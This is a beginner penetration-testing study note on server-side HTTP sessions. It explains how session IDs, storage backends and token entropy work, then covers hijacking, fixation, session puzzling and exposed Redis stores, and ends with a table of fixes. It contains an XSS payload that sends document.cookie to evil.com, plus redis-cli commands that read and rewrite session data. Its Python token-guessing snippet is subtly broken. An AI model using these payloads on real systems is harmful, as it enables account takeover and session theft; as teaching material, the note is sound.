---
tags: [vapt, http, web, beginner]
difficulty: beginner
module: "02 - HTTP Deep Dive"
topic: "02.12 Sessions — How Server-Side Sessions Work"
---

# 02.12 — Sessions — How Server-Side Sessions Work

## What is it?

A **session** solves HTTP's stateless problem by storing user state on the server. The server keeps data about who you are and what you're doing, and gives you a **session ID** (a random token) to reference it. Each request includes this session ID — the server looks it up and knows who you are.

---

## Session vs Cookie

```
COOKIE: Small data stored in BROWSER
  The VALUE is stored client-side
  Server can read it, client can modify it

SESSION: Data stored on SERVER, referenced by ID
  The ID (session token) is in the browser (usually via cookie)
  The actual data is on the server
  Client cannot see or modify session data

COMPARISON:
                COOKIE              SESSION
Data location:  Browser             Server (file/DB/memory/Redis)
Tamper-proof?   No (client edits)   Yes (ID only in browser)
Size limit:     4KB                 Unlimited
Privacy:        Visible to client   Hidden from client
Performance:    No server lookup    Requires server lookup
```

---

## How Server-Side Sessions Work

```
STEP 1: User logs in
        POST /login (username=alice, password=secret)

STEP 2: Server authenticates, creates session
        Server generates: session_id = "random_string_128_bits"
        Server stores in session store:
          "random_string_128_bits" → {user_id: 42, username: alice, role: user, logged_in: true}

STEP 3: Server sets session ID as cookie
        HTTP/1.1 200 OK
        Set-Cookie: PHPSESSID=random_string_128_bits; HttpOnly; Secure; Path=/

STEP 4: Browser stores cookie, sends on every request
        GET /dashboard HTTP/1.1
        Cookie: PHPSESSID=random_string_128_bits

STEP 5: Server looks up session
        Looks up random_string_128_bits in session store
        Gets: {user_id: 42, username: alice, role: user}
        Knows it's Alice → serves her dashboard

STEP 6: On logout, session is destroyed
        Server deletes session from store
        Session ID in cookie becomes invalid
```

---

## Session Storage Types

```
FILE-BASED (PHP default):
  /tmp/sess_abc123  → serialized PHP data
  ATTACK: If you can read /tmp → read session files!
  ATTACK: If you can write to /tmp → session injection!

DATABASE (MySQL, PostgreSQL):
  SELECT * FROM sessions WHERE session_id = 'abc123'
  More scalable, easier to audit/expire

MEMORY (Memcached, Redis):
  Very fast, but lost on server restart
  Redis: GET session:abc123
  ATTACK: Unauthenticated Redis → read all sessions!

IN-MEMORY (Node.js express-session default):
  Stored in application process memory
  Lost on restart, doesn't scale across multiple servers

JWT (stateless alternative):
  Session data IN the token (not stored server-side)
  See [[Module JWT]] for attacks
```

---

## Session Token Quality

```
WHAT MAKES A GOOD SESSION TOKEN?
  1. Cryptographically random (NOT predictable)
  2. Long enough (128+ bits = 32+ hex chars)
  3. High entropy (from CSPRNG)

BAD SESSION TOKENS (predictable):
  Sequential: session_1, session_2, session_3
  Time-based: 1704067200 (Unix timestamp)
  Username-based: alice123, bob456
  MD5 of known data: MD5(username+timestamp)
  PHP's sha1(mt_rand()) → mt_rand() is predictable with samples!

DETECTING WEAK TOKENS:
1. Collect 10+ session tokens
2. Analyze in Burp Suite Sequencer:
   - Proxy → HTTP History → right-click Set-Cookie → Send to Sequencer
   - Start live capture → analyze entropy
   - Low entropy = predictable = session hijacking possible

Python analysis:
import hashlib, time
# If token = md5(username + timestamp):
import secrets
for t in range(time.time() - 10, time.time() + 1):
    for user in ['admin', 'alice']:
        token = hashlib.md5(f"{user}{int(t)}".encode()).hexdigest()
        print(token)
```

---

## Security Context — Sessions in VAPT

### 1. Session Hijacking

```
Steal the session ID → use it → logged in as victim!

METHOD 1: XSS (if no HttpOnly)
  <script>fetch('https://evil.com/?s='+document.cookie)</script>

METHOD 2: Network sniffing (if no Secure flag or HTTP)
  tcpdump / Wireshark → capture cookie header

METHOD 3: Brute force (if weak session ID)
  Analyze entropy → brute force with Burp Intruder

METHOD 4: Log files
  If session ID in URL → appears in access logs → steal from logs
  (Why you should NOT put session IDs in URLs!)

USING STOLEN SESSION:
  In Burp Repeater: modify Cookie header to stolen session ID
  Test: GET /dashboard HTTP/1.1
        Cookie: PHPSESSID=STOLEN_ID
  If successful → you're logged in as victim
```

### 2. Session Fixation

```
ATTACK: Force victim to use session ID YOU know

PHP (vulnerable):
  GET /index.php?PHPSESSID=ATTACKER_KNOWN_ID
  PHP sets session: PHPSESSID=ATTACKER_KNOWN_ID
  Victim logs in → server promotes this session to authenticated
  Attacker uses ATTACKER_KNOWN_ID → logged in!

FIX:
  session_regenerate_id(true);  ← PHP regenerates on login
  Generate NEW session ID on authentication
```

### 3. Session Puzzling (Session Variable Overloading)

```
App reuses session variables for different purposes:
  Step 1: User accesses /forgot-password
          Session set: $_SESSION['user'] = 'alice'
  Step 2: Password reset completed
          App checks $_SESSION['user'] to know who to reset for

ATTACK:
  Instead of using forgot-password properly:
  Attacker visits /login → fails intentionally
  Session: $_SESSION['user'] = 'admin'  ← attacker controlled?
  Then visits /forgot-password → resets admin's password!

DEPENDS ON specific implementation — look for session variable reuse.
```

### 4. Concurrent Session Attack

```
TEST: Does app allow multiple sessions?
  Log in as alice → get session_1
  Log in as alice again → get session_2
  Both sessions work? → No session invalidation on new login
  
ATTACK:
  Brute force login → get valid session
  Both old and new sessions active
  User doesn't know they're being monitored
```

### 5. Redis/Memcached Exposed

```bash
# If Redis is accessible (port 6379):
redis-cli -h target-internal

# List all sessions:
redis-cli -h target KEYS "session:*"

# Read a session:
redis-cli -h target GET "session:abc123"

# Modify a session:
redis-cli -h target SET "session:abc123" '{"user":"admin","role":"admin"}'
```

---

## Hands-On: Session Testing

```bash
# Get session cookie from login
curl -c cookies.txt -X POST https://target.com/login \
  -d "username=alice&password=test"
cat cookies.txt

# Use session in subsequent requests
curl -b cookies.txt https://target.com/dashboard

# Test if session is invalidated on logout
SESSION=$(cat cookies.txt | grep session | awk '{print $NF}')
curl -b cookies.txt https://target.com/logout
curl -H "Cookie: session=$SESSION" https://target.com/dashboard
# Should return 401/302, not 200 (if properly invalidated)

# Burp Suite Sequencer — test randomness
# Proxy → any Set-Cookie response → right-click → "Send to Sequencer"
# Capture token → Analyze → check Shannon entropy

# Collect multiple session IDs to analyze:
for i in {1..20}; do
  curl -sc /dev/null -X POST https://target.com/login \
    -d "user=alice&pass=test" -o /dev/null 2>&1 | grep PHPSESSID
done
```

---

## How to Fix / Secure

| Risk | Fix |
|------|-----|
| Weak session ID entropy | Use cryptographically secure random generator |
| Session fixation | Regenerate session ID on authentication |
| Session survives logout | Destroy server-side session on logout |
| Session never expires | Set reasonable timeout (idle + absolute) |
| Session ID in URL | Use cookies only, never URL |
| Exposed session store (Redis) | Firewall Redis to only app servers, enable Redis AUTH |
| Multiple concurrent sessions | Invalidate old sessions on new login (optional) |

---

## Related Notes
- [[11 - Cookies Structure Flags Lifecycle]] — session ID delivered via cookies
- [[13 - HTTP Authentication Schemes]] — alternatives to sessions
- [[Module 05 - Session Management]] — full session attack coverage
- [[Module 02 - XSS]] — XSS to steal sessions
- [[Module 07 - CSRF]] — abusing sessions via CSRF
